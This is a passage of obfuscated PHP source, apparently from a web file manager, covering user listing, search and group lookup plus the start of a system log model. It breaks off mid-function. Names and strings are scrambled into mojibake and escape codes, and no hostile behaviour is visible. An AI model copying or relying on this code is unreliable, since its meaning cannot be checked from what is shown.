listByID($–û›ÊŠ‹) { $Ìˆ—Øã° =& $_SERVER[è¶³ÒßÑ]; if (!$–û›ÊŠ‹) { return; } $›¸²˜ = array($Ìˆ—Øã°[1761] => array($Ìˆ—Øã°[7], $–û›ÊŠ‹)); $Ï™Şí‰© = $this->where($›¸²˜)->select(); $Ï™Şí‰© = array_sort_keep($Ï™Şí‰©, $Ìˆ—Øã°[1761], $–û›ÊŠ‹); $this->_listDataApply($Ï™Şí‰©); return $Ï™Şí‰©; } public function listByGroup($”¡ª—Å‰ = 0, $ÎêîÛ£÷ = array()) { $å¤›öˆœ =& $_SERVER[è¶³ÒßÑ]; $ÈÃßîóï = $å¤›öˆœ[12]; $ìÌ·õî½ = array(); if ($”¡ª—Å‰) { $ìÌ·õî½ = array($å¤›öˆœ[2476] => intval($”¡ª—Å‰)); $ÈÃßîóï = "\114\x45\x46\124\x20\112\x4f\x49\116\40{$this->tablePrefix}\x75\x73\145\x72\x5f\147\x72\157\165\x70\40\165\163\x65\x72\137\x67\x72\x6f\x75\160\40\x6f\156\40\x75\x73\x65\162\x2e\x75\163\x65\162\111\104\40\x3d\40\x75\163\145\162\137\x67\x72\157\x75\x70\56\165\x73\145\x72\111\104"; $²ŠÔË°— = Input::get($å¤›öˆœ[523], null, $å¤›öˆœ[12]) ? $å¤›öˆœ[12] : $å¤›öˆœ[2477]; } if (isset($ÎêîÛ£÷[$å¤›öˆœ[804]])) { $ìÌ·õî½[$å¤›öˆœ[2478]] = $ÎêîÛ£÷[$å¤›öˆœ[804]]; } $Á­¦¦ù¾ = $this->_makeOrder($²ŠÔË°—)->field($å¤›öˆœ[2479])->where($ìÌ·õî½)->join($ÈÃßîóï)->selectPage(50); $this->_listDataApply($Á­¦¦ù¾[$å¤›öˆœ[438]]); return $Á­¦¦ù¾; } private function _makeOrder($ŞºÖí°Ä = '') { $ï›å§¼ =& $_SERVER[è¶³ÒßÑ]; $¾‹–Àºå = array($ï›å§¼[1761], $ï›å§¼[32], $ï›å§¼[1948], $ï›å§¼[2165], $ï›å§¼[1920], $ï›å§¼[241]); $«ğ²£òÓ = array($ï›å§¼[516] => $ï›å§¼[517], $ï›å§¼[518] => $ï›å§¼[519]); $ÇÉÎª€‰ = Input::get($ï›å§¼[523], $ï›å§¼[7], $ï›å§¼[1752], $¾‹–Àºå); $ÜÌ¾Œğ© = Input::get($ï›å§¼[524], $ï›å§¼[7], $ï›å§¼[2054], array($ï›å§¼[2054], $ï›å§¼[518])); $ÜÌ¾Œğ© = $«ğ²£òÓ[$ÜÌ¾Œğ©]; $ŞºÖí°Ä = $ŞºÖí°Ä . "\x75\x73\x65\162\56{$ÇÉÎª€‰}\40{$ÜÌ¾Œğ©}\54\x20\165\x73\145\x72\x2e\x75\x73\x65\162\x49\x44\40\x61\163\143"; return $this->alias($ï›å§¼[2181])->order($ŞºÖí°Ä); } public function listSearch($Æ€•˜) { $ª—îòä =& $_SERVER[è¶³ÒßÑ]; $ü¹‘ïÑ = trim($Æ€•˜[$ª—îòä[2057]]); $ƒ¨İæ×À = explode($ª—îòä[53], $ü¹‘ïÑ); if (!$ü¹‘ïÑ || count($ƒ¨İæ×À) == 1) { return $this->listSearchNow($Æ€•˜); } $…¹–Ÿö = array($ª—îòä[438] => array()); foreach ($ƒ¨İæ×À as $Ò¨·§§) { if (!trim($Ò¨·§§)) { continue; } $Æ€•˜[$ª—îòä[2057]] = $Ò¨·§§; $¤ğØ¸äÙ = $this->listSearchNow($Æ€•˜); $…¹–Ÿö[$ª—îòä[438]] = array_merge($…¹–Ÿö[$ª—îòä[438]], $¤ğØ¸äÙ[$ª—îòä[438]]); } $…¹–Ÿö[$ª—îòä[438]] = array_unique_by_key($…¹–Ÿö[$ª—îòä[438]], $ª—îòä[1761]); $…¹–Ÿö[$ª—îòä[435]] = array($ª—îòä[436] => count($…¹–Ÿö[$ª—îòä[438]]), $ª—îòä[432] => 20, $ª—îòä[422] => 1, $ª—îòä[437] => 1); return $…¹–Ÿö; } public function listSearchNow($–—––ì°) { $Ë£¡ê¥ =& $_SERVER[è¶³ÒßÑ]; $ƒâßåğ = trim($–—––ì°[$Ë£¡ê¥[2057]]); $Èóªƒ‹ï = isset($–—––ì°[$Ë£¡ê¥[2058]]) ? $–—––ì°[$Ë£¡ê¥[2058]] : !1; $ƒâßåğ = str_replace($Ë£¡ê¥[2059], $Ë£¡ê¥[2060], trim($ƒâßåğ)); $°şØ¦™¥ = array($Ë£¡ê¥[32] => array($Ë£¡ê¥[452], "\45{$ƒâßåğ}\45"), $Ë£¡ê¥[374] => array($Ë£¡ê¥[452], "{$ƒâßåğ}\45"), $Ë£¡ê¥[2247] => array($Ë£¡ê¥[452], "{$ƒâßåğ}\x25"), $Ë£¡ê¥[1053] => $Ë£¡ê¥[2061]); if (Input::check($ƒâßåğ, $Ë£¡ê¥[380])) { $°şØ¦™¥[$Ë£¡ê¥[1761]] = array($Ë£¡ê¥[452], "{$ƒâßåğ}\x25"); $°şØ¦™¥[$Ë£¡ê¥[2461]] = array($Ë£¡ê¥[452], "{$ƒâßåğ}\45"); } if (!$ƒâßåğ) { $°şØ¦™¥ = array(); } if (isset($–—––ì°[$Ë£¡ê¥[804]])) { $°şØ¦™¥[$Ë£¡ê¥[804]] = $–—––ì°[$Ë£¡ê¥[804]]; } $°şØ¦™¥ = $this->parseWhereLike($°şØ¦™¥); $‹¦–Ì– = $this->_makeOrder()->where($°şØ¦™¥)->selectPage(20); if (!$‹¦–Ì– || count($‹¦–Ì–[$Ë£¡ê¥[438]]) < 5 && Input::check($ƒâßåğ, $Ë£¡ê¥[387])) { $Ô†²á = $this->_searchFromMeta($Ë£¡ê¥[530], $ƒâßåğ, 10); $äÙ¹â„‰ = $this->_searchFromMeta($Ë£¡ê¥[531], $ƒâßåğ, 10); $ó‚û »ö = array_merge($Ô†²á, $äÙ¹â„‰, $‹¦–Ì–[$Ë£¡ê¥[438]]); $‹¦–Ì–[$Ë£¡ê¥[438]] = array_unique_by_key($ó‚û »ö, $Ë£¡ê¥[1761]); $‹¦–Ì–[$Ë£¡ê¥[435]][$Ë£¡ê¥[436]] = count($‹¦–Ì–[$Ë£¡ê¥[438]]); $‹¦–Ì–[$Ë£¡ê¥[435]][$Ë£¡ê¥[437]] = ceil($‹¦–Ì–[$Ë£¡ê¥[435]][$Ë£¡ê¥[436]] / $‹¦–Ì–[$Ë£¡ê¥[435]][$Ë£¡ê¥[432]]); } $this->_listDataApply($‹¦–Ì–[$Ë£¡ê¥[438]]); $this->_filterByGroup($‹¦–Ì–, $Èóªƒ‹ï); return $‹¦–Ì–; } private function _filterByGroup(&$³¶ŸÙ¬ø, $’ŠöÆ–) { $±€’Ì¶„ =& $_SERVER[è¶³ÒßÑ]; if (!$’ŠöÆ–) { return $³¶ŸÙ¬ø; } foreach ($³¶ŸÙ¬ø[$±€’Ì¶„[438]] as $ŒœÂæş“ => &$œŞ¡¾óÅ) { $¿‰ÜÂÌ¶ = array_to_keyvalue($œŞ¡¾óÅ[$±€’Ì¶„[2150]], $±€’Ì¶„[12], $±€’Ì¶„[1959]); if (!in_array($’ŠöÆ–, $¿‰ÜÂÌ¶)) { unset($³¶ŸÙ¬ø[$±€’Ì¶„[438]][$ŒœÂæş“]); } } unset($œŞ¡¾óÅ); $³¶ŸÙ¬ø[$±€’Ì¶„[438]] = array_values($³¶ŸÙ¬ø[$±€’Ì¶„[438]]); $³¶ŸÙ¬ø[$±€’Ì¶„[435]] = array($±€’Ì¶„[2217] => count($³¶ŸÙ¬ø[$±€’Ì¶„[438]]), $±€’Ì¶„[2215] => $³¶ŸÙ¬ø[$±€’Ì¶„[435]][$±€’Ì¶„[432]], $±€’Ì¶„[2214] => 1, $±€’Ì¶„[2216] => 1); } private function _searchFromMeta($ÄÊÑ“Ùß, $Ôæ´œ†ª, $¿ÑÕ²‡Í) { $°ßºÃÈå =& $_SERVER[è¶³ÒßÑ]; $Ôæ´œ†ª = strtolower($Ôæ´œ†ª); $ÆÕ ‰»¥ = array($°ßºÃÈå[107] => $ÄÊÑ“Ùß, $°ßºÃÈå[443] => array($°ßºÃÈå[452], "\x25{$Ôæ´œ†ª}\x25")); $ÆÕ ‰»¥ = $this->parseWhereLike($ÆÕ ‰»¥); $ÖÄ„ÊµŞ = Model($°ßºÃÈå[2480])->where($ÆÕ ‰»¥)->limit($¿ÑÕ²‡Í)->select(); if (!$ÖÄ„ÊµŞ) { return array(); } $ÖÄ„ÊµŞ = array_to_keyvalue($ÖÄ„ÊµŞ, $°ßºÃÈå[12], $°ßºÃÈå[1761]); $ÃÈ¸¶ô = $this->where(array($°ßºÃÈå[1752] => array($°ßºÃÈå[7], $ÖÄ„ÊµŞ)))->select(); if (!$ÃÈ¸¶ô) { return array(); } return $ÃÈ¸¶ô; } private function _listDataApplyItem($¢Á€ƒ¶Ù) { $Ÿ¡©Çíõ = array($¢Á€ƒ¶Ù); $this->_listDataApply($Ÿ¡©Çíõ); return $Ÿ¡©Çíõ[0]; } private function _listDataApply(&$ÍÑ†îÜí) { $ö‚¸˜ÄÓ =& $_SERVER[è¶³ÒßÑ]; if (!$ÍÑ†îÜí) { return; } array_remove_key($ÍÑ†îÜí, $ö‚¸˜ÄÓ[942]); $©ó¼Üİ° = array_to_keyvalue($ÍÑ†îÜí, $ö‚¸˜ÄÓ[12], $ö‚¸˜ÄÓ[1761]); $this->_listAppendGroup($ÍÑ†îÜí, $©ó¼Üİ°); $this->_listAppendMeta($ÍÑ†îÜí, $©ó¼Üİ°); $this->_listAppendSourceRoot($ÍÑ†îÜí, $©ó¼Üİ°); } private function _listAppendSourceRoot(&$ì¡áÖ”, $âùúÀãã) { $Ù®òê˜ =& $_SERVER[è¶³ÒßÑ]; $ÄùŞÓ»‹ = Model($Ù®òê˜[878])->listSourceRoot(SourceModel::TYPE_USER, $âùúÀãã); $ÄùŞÓ»‹ = array_to_keyvalue($ÄùŞÓ»‹, $Ù®òê˜[562]); $ÄùŞÓ»‹ = array_remove_key($ÄùŞÓ»‹, $Ù®òê˜[562]); foreach ($ì¡áÖ” as &$ ä»çæã) { $ ä»çæã[$Ù®òê˜[100]] = $ÄùŞÓ»‹[$ ä»çæã[$Ù®òê˜[1761]]] ? $ÄùŞÓ»‹[$ ä»çæã[$Ù®òê˜[1761]]] : array(); } unset($ ä»çæã); } private function _listAppendGroup(&$˜È¹³, $Áõö‹ƒ©) { $½†©Ğ–© =& $_SERVER[è¶³ÒßÑ]; $¦µß¿Í¬ = array($½†©Ğ–©[1761] => array($½†©Ğ–©[7], $Áõö‹ƒ©)); $‘„äÎ†ú = Model($½†©Ğ–©[2053])->where($¦µß¿Í¬)->select(); $Ë“¦â€à = array_to_keyvalue($‘„äÎ†ú, $½†©Ğ–©[12], $½†©Ğ–©[1959]); $Ë“¦â€à = array_remove_value(array_unique($Ë“¦â€à), $½†©Ğ–©[238]); if (!$Ë“¦â€à || !$‘„äÎ†ú) { return; } $¦µß¿Í¬ = array($½†©Ğ–©[1959] => array($½†©Ğ–©[7], $Ë“¦â€à)); $Íû‡á¿ = Model($½†©Ğ–©[2148])->field($½†©Ğ–©[2481])->where($¦µß¿Í¬)->select(); $Íû‡á¿ = array_to_keyvalue($Íû‡á¿, $½†©Ğ–©[1959]); $‘„äÎ†ú = array_to_keyvalue_group($‘„äÎ†ú, $½†©Ğ–©[1761]); foreach ($‘„äÎ†ú as &$ÀŠı¦) { $ëÕòçàç = array(); foreach ($ÀŠı¦ as $ú–‡ÁÃâ) { if (!$ú–‡ÁÃâ[$½†©Ğ–©[2067]]) { continue; } $Éê©€ÆÅ = Model($½†©Ğ–©[564])->listData($ú–‡ÁÃâ[$½†©Ğ–©[2067]]); $ëÕòçàç[] = array($½†©Ğ–©[1959] => $ú–‡ÁÃâ[$½†©Ğ–©[1959]], $½†©Ğ–©[2482] => $Íû‡á¿[$ú–‡ÁÃâ[$½†©Ğ–©[1959]]][$½†©Ğ–©[32]], $½†©Ğ–©[577] => $Íû‡á¿[$ú–‡ÁÃâ[$½†©Ğ–©[1959]]][$½†©Ğ–©[577]], $½†©Ğ–©[480] => $Éê©€ÆÅ); } $ÀŠı¦ = $ëÕòçàç; } unset($ÀŠı¦); foreach ($˜È¹³ as &$»Ïø·) { $»Ïø·[$½†©Ğ–©[2150]] = array(); if (isset($‘„äÎ†ú[$»Ïø·[$½†©Ğ–©[1761]]])) { $»Ïø·[$½†©Ğ–©[2150]] = $‘„äÎ†ú[$»Ïø·[$½†©Ğ–©[1761]]]; } } unset($»Ïø·); } public function userAppendGroup($ğŸéù»•) { $ÎîĞø©§ =& $_SERVER[è¶³ÒßÑ]; if (!$ğŸéù»•) { return array(); } $this->_listAppendGroup($ğŸéù»•, array_to_keyvalue($ğŸéù»•, $ÎîĞø©§[12], $ÎîĞø©§[1761])); return $ğŸéù»•; } private function _listAppendMeta(&$­Œèãôô, $‡òáÖÎ…) { $¾·¯ñÖ© =& $_SERVER[è¶³ÒßÑ]; $ëå¤îÀÀ = UserJobModel::JOB_KEY; $¶ÂŒî¢ = array($¾·¯ñÖ©[2462]); $Œ¡Ûû¬÷ = array($¾·¯ñÖ©[1761] => array($¾·¯ñÖ©[7], $‡òáÖÎ…)); $¿¨ºÆÃ = Model($¾·¯ñÖ©[2460])->where($Œ¡Ûû¬÷)->select(); $¿¨ºÆÃ = array_to_keyvalue_group($¿¨ºÆÃ, $¾·¯ñÖ©[1761]); foreach ($¿¨ºÆÃ as &$„èûÌ¯) { $æí‚ñ¹Å = array(); foreach ($„èûÌ¯ as $±üÙÆŞØ) { if (!in_array($±üÙÆŞØ[$¾·¯ñÖ©[107]], $¶ÂŒî¢)) { $æí‚ñ¹Å[$±üÙÆŞØ[$¾·¯ñÖ©[107]]] = $±üÙÆŞØ[$¾·¯ñÖ©[443]]; } } $„èûÌ¯ = $æí‚ñ¹Å; } unset($„èûÌ¯); $²€®À¿Î = Model($¾·¯ñÖ©[2483]); foreach ($­Œèãôô as &$òùû›ü) { $Á¸”·¼¦ = array(); if (isset($¿¨ºÆÃ[$òùû›ü[$¾·¯ñÖ©[1761]]])) { $Á¸”·¼¦ = $¿¨ºÆÃ[$òùû›ü[$¾·¯ñÖ©[1761]]]; } $òùû›ü[$¾·¯ñÖ©[2484]] = array(); if (isset($Á¸”·¼¦[$ëå¤îÀÀ])) { $òùû›ü[$¾·¯ñÖ©[2484]] = $²€®À¿Î->getUserJobInfo($Á¸”·¼¦[$ëå¤îÀÀ]); } } unset($òùû›ü); } protected function groupUserAll($ÙÅÑ¶×†) { $¨Âá¡§¥ =& $_SERVER[è¶³ÒßÑ]; if (!$ÙÅÑ¶×†) { return !1; } $ÔÍ¿ıù  = Model($¨Âá¡§¥[2053])->field($¨Âá¡§¥[1761])->where(array($¨Âá¡§¥[1959] => array($¨Âá¡§¥[7], $ÙÅÑ¶×†)))->select(); $ÔÍ¿ıù  = array_to_keyvalue($ÔÍ¿ıù , $¨Âá¡§¥[12], $¨Âá¡§¥[1761]); return array_unique($ÔÍ¿ıù ); } public function userSearch($Ò À–Ò, $Ó…ã‚œª = "\52") { return Model($_SERVER[è¶³ÒßÑ][591])->where($Ò À–Ò)->field($Ó…ã‚œª)->find(); } } goto f¿İ˜¥é³; F ¼¡ èù“: class SystemLogModel extends ModelBase { protected $tableName = "\x73\x79\163\x74\x65\x6d\x5f\x6c\x6f\x67"; protected $dataAuto = array(array("\143\162\145\x61\x74\145\124\151\x6d\x65", "\164\x69\155\145", "\151\156\x73\145\162\164", "\146\x75\156\x63\x74\151\157\156")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $ïÍ…Ê² =& $_SERVER[è¶³ÒßÑ]; return array($ïÍ…Ê²[2319] => LNG($ïÍ…Ê²[2320]), $ïÍ…Ê²[2321] => LNG($ïÍ…Ê²[2322]), $ïÍ…Ê²[1902] => LNG($ïÍ…Ê²[2323]), $ïÍ…Ê²[2324] => LNG($ïÍ…Ê²[2325]), $ïÍ…Ê²[2326] => LNG($ïÍ…Ê²[2327]), $ïÍ…Ê²[2328] => LNG($ïÍ…Ê²[2329]), $ïÍ…Ê²[2330] => LNG($ïÍ…Ê²[2331]), $ïÍ…Ê²[1932] => LNG($ïÍ…Ê²[2331]), $ïÍ…Ê²[1933] => LNG($ïÍ…Ê²[2332]), $ïÍ…Ê²[2333] => LNG($ïÍ…Ê²[2334]), $ïÍ…Ê²[2335] => LNG($ïÍ…Ê²[2336]), $ïÍ…Ê²[2337] => LNG($ïÍ…Ê²[2338]), $ïÍ…Ê²[2339] => LNG($ïÍ…Ê²[2340]), $ïÍ…Ê²[1930] => LNG($ïÍ…Ê²[2341]), $ïÍ…Ê²[2342] => LNG($ïÍ…Ê²[2343]), $ïÍ…Ê²[1937] => LNG($ïÍ…Ê²[2344]), $ïÍ…Ê²[2345] => LNG($ïÍ…Ê²[2346]), $ïÍ…Ê²[2347] => LNG($ïÍ…Ê²[2348]), $ïÍ…Ê²[2349] => LNG($ïÍ…Ê²[2350]), $ïÍ…Ê²[2351] => LNG($ïÍ…Ê²[2352]), $ïÍ…Ê²[1940] => LNG($ïÍ…Ê²[2353]), $ïÍ…Ê²[1941] => LNG($ïÍ…Ê²[2354]), $ïÍ…Ê²[2355] => LNG($ïÍ…Ê²[2356]), $ïÍ…Ê²[2357] => LNG($ïÍ…Ê²[2358]), $ïÍ…Ê²[2359] => LNG($ïÍ…Ê²[2360]), $ïÍ…Ê²[1935] => LNG($ïÍ…Ê²[2361]), $ïÍ…Ê²[2362] => LNG($ïÍ…Ê²[2363]), $ïÍ…Ê²[1934] => LNG($ïÍ…Ê²[2364]), $ïÍ…Ê²[2365] => LNG($ïÍ…Ê²[2366]), $ïÍ…Ê²[2367] => LNG($ïÍ…Ê²[2368]), $ïÍ…Ê²[2369] => LNG($ïÍ…Ê²[2368]), $ïÍ…Ê²[2370] => LNG($ïÍ…Ê²[2371]), $ïÍ…Ê²[2372] => LNG($ïÍ…Ê²[2372]), $ïÍ…Ê²[2373] => LNG($ïÍ…Ê²[1906]), $ïÍ…Ê²[2374] => LNG($ïÍ…Ê²[2375]), $ïÍ…Ê²[2376] => LNG($ïÍ…Ê²[2377]), $ïÍ…Ê²[2378] => LNG($ïÍ…Ê²[2379]), $ïÍ…Ê²[2380] => LNG($ïÍ…Ê²[2381]), $ïÍ…Ê²[2382] => LNG($ïÍ…Ê²[2383]), $ïÍ…Ê²[2384] => LNG($ïÍ…Ê²[2384]), $ïÍ…Ê²[2385] => LNG($ïÍ…Ê²[2386]), $ïÍ…Ê²[2387] => LNG($ïÍ…Ê²[2388]), $ïÍ…Ê²[2389] => LNG($ïÍ…Ê²[2390]), $ïÍ…Ê²[2391] => LNG($ïÍ…Ê²[2392]), $ïÍ…Ê²[2393] => LNG($ïÍ…Ê²[2394]), $ïÍ…Ê²[2395] => LNG($ïÍ…Ê²[2396]), $ïÍ…Ê²[222] => LNG($ïÍ…Ê²[222]), $ïÍ…Ê²[223] => LNG($ïÍ…Ê²[2397]), $ïÍ…Ê²[2398] => LNG($ïÍ…Ê²[2398])); } private function typeFile() { $Â†€¬Û =& $_SERVER[è¶³ÒßÑ]; $ûÖÇˆ‰Í = array($Â†€¬Û[1937] => array($Â†€¬Û[1938]), $Â†€¬Û[2337] => array($Â†€¬Û[2399]), $Â†€¬Û[2339] => array($Â†€¬Û[2400]), $Â†€¬Û[1930] => array($Â†€¬Û[1931], $Â†€¬Û[2401]), $Â†€¬Û[2347] => array(), $Â†€¬Û[2349] => array(), $Â†€¬Û[2351] => array(), $Â†€¬Û[1940] => array($Â†€¬Û[1942]), $Â†€¬Û[1941] => array($Â†€¬Û[1942]), $Â†€¬Û[2355] => array($Â†€¬Û[2402]), $Â†€¬Û[2357] => array($Â†€¬Û[2402]), $Â†€¬Û[2359] => array($Â†€¬Û[2403]), $Â†€¬Û[2345] => array($Â†€¬Û[2404]), $Â†€¬Û[1935] => array($Â†€¬Û[2405]), $Â†€¬Û[2362] => array($Â†€¬Û[2406]), $Â†€¬Û[1934] => array($Â†€¬Û[1936])); return $ûÖÇˆ‰Í; } private function typeAll() { $€ä²Òğº =& $_SERVER[è¶³ÒßÑ]; $™óÏŸçÏ = $this->typeList; $úÂ´¦‰¯ = array_filter($this->typeFile()); foreach ($úÂ´¦‰¯ as $÷¡…¼˜‚ => $âÊì£ûÙ) { $™óÏŸçÏ[$âÊì£ûÙ[0]] = $™óÏŸçÏ[$÷¡…¼˜‚]; } $™óÏŸçÏ[$€ä²Òğº[1942]] = LNG($€ä²Òğº[2407]); $™óÏŸçÏ[$€ä²Òğº[2402]] = LNG($€ä²Òğº[2408]); return $™óÏŸçÏ; } public function addLog($»“ñ’Ö’, $´ûìÑ¦Á = array()) { $äÁ¤©†Ö =& $_SERVER[è¶³ÒßÑ]; if (!isset($this->typeList[$»“ñ’Ö’])) { return; } $ù»·à’Ô = Session::get($äÁ¤©†Ö[2100]); if (!$ù»·à’Ô) { $ù»·à’Ô = _get($´ûìÑ¦Á, $äÁ¤©†Ö[1761], 0); } if ($»“ñ’Ö’ == $äÁ¤©†Ö[2374] && is_array($´ûìÑ¦Á[$äÁ¤©†Ö[2409]]) && !$´ûìÑ¦Á[$äÁ¤©†Ö[2409]]) { return; } $—ÍÏ ÷ˆ = get_client_ip(); if (!$´ûìÑ¦Á || strlen(json_encode($´ûìÑ¦Á)) >= 1024 * 64) { if ($´ûìÑ¦Á && is_array($´ûìÑ¦Á)) { $´ûìÑ¦Á = array_intersect_key($´ûìÑ¦Á, array_flip($äÁ¤©†Ö[468], $äÁ¤©†Ö[32])); $´ûìÑ¦Á[$äÁ¤©†Ö[2410]] = $—ÍÏ ÷ˆ; } else { $´ûìÑ¦Á = array($äÁ¤©†Ö[2410] => $—ÍÏ ÷ˆ); } } else { if (is_array($´ûìÑ¦Á)) { $´ûìÑ¦Á[$äÁ¤©†Ö[2410]] = $—ÍÏ ÷ˆ; } else { $´ûìÑ¦Á = array($äÁ¤©†Ö[1262] => $´ûìÑ¦Á, $äÁ¤©†Ö[2410] => $—ÍÏ ÷ˆ); } } $´ûìÑ¦Á = array($äÁ¤©†Ö[1751] => Session::sign(), $äÁ¤©†Ö[1752] => intval($ù»·à’Ô), $äÁ¤©†Ö[33] => $»“ñ’Ö’, $äÁ¤©†Ö[1754] => json_encode($´ûìÑ¦Á)); parent::add($´ûìÑ¦Á); } public function remove($’¶å­Ï¢) { $this->where(array($_SERVER[è¶³ÒßÑ][486] => $’¶å­Ï¢))->delete(); } private function _makeOrder($¢¾ÓÏŞÒ = '') { $øõ‡Ö©î =& $_SERVER[è¶³ÒßÑ]; $ÏÎËóÊ‡ = $øõ‡Ö©î[241]; $úÔ¦›î = array($øõ‡Ö©î[516] => $øõ‡Ö©î[517], $øõ‡Ö©î[518] => $øõ‡Ö©î[519]); $ğçµ¼ßİ = Input::get($øõ‡Ö©î[524], $øõ‡Ö©î[7], $øõ‡Ö©î[2136], array($øõ‡Ö©î[2054], $øõ‡Ö©î[518])); $ğçµ¼ßİ = $úÔ¦›î[$ğçµ¼ßİ]; $¢¾ÓÏŞÒ = $¢¾ÓÏŞÒ . "{$ÏÎËóÊ‡}\40{$ğçµ¼ßİ}"; return $this->order($¢¾ÓÏŞÒ); } public function get($Ñ†“°Îì = '') { $øˆüÌŸá =& $_SERVER[è¶³ÒßÑ]; if (!$Ñ†“°Îì) { show_json(array()); } $ÇÑºíí = array(); if ($Ñ†“°Îì[$øˆüÌŸá[1761]]) { $ÇÑºíí[$øˆüÌŸá[1761]] = $Ñ†“°Îì[$øˆüÌŸá[1761]]; } if (isset($Ñ†“°Îì[$øˆüÌŸá[814]])) { $úôÚÜí• = $Ñ†“°Îì[$øˆüÌŸá[814]]; $»½Æƒ‰ò = isset($Ñ†“°Îì[$øˆüÌŸá[815]]) ? $Ñ†“°Îì[$øˆüÌŸá[815]] : time(); $ÇÑºíí[$øˆüÌŸá[241]] = array($øˆüÌŸá[402], array($úôÚÜí•, $»½Æƒ‰ò)); } if ($Ñ†“°Îì[$øˆüÌŸá[33]]) { $‘ê×¥•› = explode($øˆüÌŸá[50], $Ñ†“°Îì[$øˆüÌŸá[33]]); $•çÖ = $this->typeFile(); $Àş¹ÉáÕ = array(); foreach ($‘ê×¥•› as $Ş «ßƒ) { $Àş¹ÉáÕ[] = $Ş «ßƒ; if (isset($•çÖ[$Ş «ßƒ])) { $Àş¹ÉáÕ = array_merge($Àş¹ÉáÕ, $•çÖ[$Ş «ßƒ]); } } $Àş¹ÉáÕ = array_unique($Àş¹ÉáÕ); if ($Àş¹ÉáÕ) { $ÇÑºíí[$øˆüÌŸá[33]] = array($øˆüÌŸá[7], $Àş¹ÉáÕ); } } else { $ÇÑºíí[$øˆüÌŸá[33]] = array($øˆüÌŸá[2411], $øˆüÌŸá[2412]); } if (!empty($Ñ†“°Îì[$øˆüÌŸá[2410]])) { $ÇÑºíí[$øˆüÌŸá[519]] = array($øˆüÌŸá[452], "\x25{$Ñ†“°Îì[$øˆüÌŸá[2410]]}\x25"); } $­Ù…€ÈÎ = $this->_makeOrder()->where($ÇÑºíí)->selectPage(); if (empty($­Ù…€ÈÎ[$øˆüÌŸá[438]])) { show_json(array(), !0, $­Ù…€ÈÎ[$øˆüÌŸá[435]]); } $­Ù…€ÈÎ[$øˆüÌŸá[438]] = $this->logList($­Ù…€ÈÎ[$øˆüÌŸá[438]]); return $­Ù…€ÈÎ; } private function ipAddress(&$çµæš´†) { $çÚ³ê® =& $_SERVER[è¶³ÒßÑ]; if (!empty($çµæš´†[$çÚ³ê®[2410]])) { $¶œé¹çì = IpLocation::get($çµæš´†[$çÚ³ê®[2410]]); } else { $¶œé¹çì = LNG($çÚ³ê®[2413]); } $çµæš´†[$çÚ³ê®[2414]] = $¶œé¹çì; } private function descZipDownload($Ô‚¦¬Í, &$˜òƒ—¬·) { $˜Ú¬ô° =& $_SERVER[è¶³ÒßÑ]; if (!isset($Ô‚¦¬Í[$˜Ú¬ô°[2415]])) { return; } $ÓÎ…’÷˜ = json_decode($Ô‚¦¬Í[$˜Ú¬ô°[2415]], !0); foreach ($ÓÎ…’÷˜ as $‰ªªŞŞ ) { try { $™ŸŸıû” = IO::infoFullSimple($‰ªªŞŞ [$˜Ú¬ô°[97]]); } catch (Exception $ò«æÔÅ¥) { continue; } $Ô‚¦¬Í[$˜Ú¬ô°[97]] = $‰ªªŞŞ [$˜Ú¬ô°[97]]; $˜òƒ—¬·[] = $Ô‚¦¬Í[$˜Ú¬ô°[203]] = $™ŸŸıû”[$˜Ú¬ô°[203]]; $˜òƒ—¬·[] = $Ô‚¦¬Í[$˜Ú¬ô°[2192]] = $™ŸŸıû”[$˜Ú¬ô°[202]]; break; } return $Ô‚¦¬Í; } private function getSourceList(&$ƒ›ÇÏ†) { $Çé¹øÚ¯ =& $_SERVER[è¶³ÒßÑ]; $”‚›¦“À = array(); foreach ($ƒ›ÇÏ† as $³‘ÆĞË  => $À°š§¶Î) { $¢Äˆ†ã˜ = json_decode($À°š§¶Î[$Çé¹øÚ¯[519]], !0); if ($À°š§¶Î[$Çé¹øÚ¯[33]] == $Çé¹øÚ¯[1933]) { $¢Äˆ†ã˜ = $this->descZipDownload($¢Äˆ†ã˜, $”‚›¦“À); $ƒ›ÇÏ†[$³‘ÆĞË ][$Çé¹øÚ¯[519]] = json_encode($¢Äˆ†ã˜); continue; } if (strpos($À°š§¶Î[$Çé¹øÚ¯[33]], $Çé¹øÚ¯[2194]) !== 0) { if (!isset($¢Äˆ†ã˜[$Çé¹øÚ¯[97]]) || strpos($À°š§¶Î[$Çé¹øÚ¯[33]], $Çé¹øÚ¯[2416]) !== 0) { continue; } try { $Ûù˜ÑÉˆ = IO::infoFullSimple($¢Äˆ†ã˜[$Çé¹øÚ¯[97]]); } catch (Exception $šÃäè•š) { continue; } $”‚›¦“À[] = $¢Äˆ†ã˜[$Çé¹øÚ¯[203]] = $Ûù˜ÑÉˆ[$Çé¹øÚ¯[203]]; $”‚›¦“À[] = $¢Äˆ†ã˜[$Çé¹øÚ¯[2192]] = $Ûù˜ÑÉˆ[$Çé¹øÚ¯[202]]; $ƒ›ÇÏ†[$³‘ÆĞË ][$Çé¹øÚ¯[519]] = json_encode($¢Äˆ†ã˜); continue; } $”‚›¦“À[] = $¢Äˆ†ã˜[$Çé¹øÚ¯[203]]; $”‚›¦“À[] = $¢Äˆ†ã˜[$Çé¹øÚ¯[2192]]; if ($¢Äˆ†ã˜[$Çé¹øÚ¯[33]] == $Çé¹øÚ¯[613]) { $”‚›¦“À[] = $¢Äˆ†ã˜[$Çé¹øÚ¯[519]][$Çé¹øÚ¯[1216]]; $”‚›¦“À[] = $¢Äˆ†ã˜[$Çé¹øÚ¯[519]][$Çé¹øÚ¯[1217]]; } if ($¢Äˆ†ã˜[$Çé¹øÚ¯[33]] == $Çé¹øÚ¯[2203]) { $”‚›¦“À[] = $¢Äˆ†ã˜[$Çé¹øÚ¯[519]][$Çé¹øÚ¯[203]]; } } if (!$”‚›¦“À) { return array(); } return Model($Çé¹øÚ¯[878])->sourceListInfo($”‚›¦“À, !0); } private function logList($ŞĞ—ÍñÔ) { $×í¶‘ùî =& $_SERVER[è¶³ÒßÑ]; $ÉĞ…ô÷ş = array_to_keyvalue($ŞĞ—ÍñÔ, $×í¶‘ùî[12], $×í¶‘ùî[1761]); $êû‰Ì´Ä = Model($×í¶‘ùî[591])->userListInfo(array_unique($ÉĞ…ô÷ş)); $ÜŒáü²è = $this->getSourceList($ŞĞ—ÍñÔ); $šïçñÚ = $this->typeAll(); $­Ú½Ù“ = array(); $ëŠÒ‰èÃ = array(); foreach ($ŞĞ—ÍñÔ as 